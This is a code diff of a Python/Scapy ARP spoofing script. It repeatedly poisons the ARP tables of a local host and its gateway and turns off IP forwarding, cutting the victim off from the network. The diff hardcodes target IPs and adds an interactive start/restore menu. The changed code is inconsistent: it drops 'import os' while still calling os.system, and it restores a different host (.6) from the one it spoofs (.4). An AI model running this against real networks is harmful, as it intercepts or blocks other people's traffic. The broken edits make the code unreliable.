@@ -1,7 +1,6 @@
 from scapy.all import srp,send,ARP
 import scapy.all as scapy
 import time
-import os
 
 def get_mac(ip):
     mac = "xx"
@@ -36,29 +35,19 @@ def spoof(target_ip,spoof_ip):
 def start():
     count = 0 
     while True:
-        if flg == 3:
-            break
-        spoof(hostIp,gateIp)
-        spoof(gateIp,hostIp)
+        spoof("192.168.1.4","192.168.1.1")
+        spoof("192.168.1.1","192.168.1.4")
         print("Packet Counts : ",count)
         count = count + 1
         time.sleep(2)
-
 def stop():
-    restore(hostIp,gateIp)#restore(target ip , router ip )
+    restore("192.168.1.6","192.168.1.1")#restore(target ip , router ip )
 
-def thpoint(gates,hosts,flgs):  
-    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
-    global gateIp 
-    gateIp = gates
-    global hostIp 
-    hostIp = hosts
-    global flg
-    flg = flgs
-    # print("1.start \n 2. restore")
-    # n = int(input("enter ur value : "))
-    n = 1
-    if n == 1 : 
-        start()
-    else : 
-        stop()
+    
+os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
+print("1.start \n 2. restore")
+n = int(input("enter ur value : "))
+if n == 1 : 
+    start()
+else : 
+    stop()
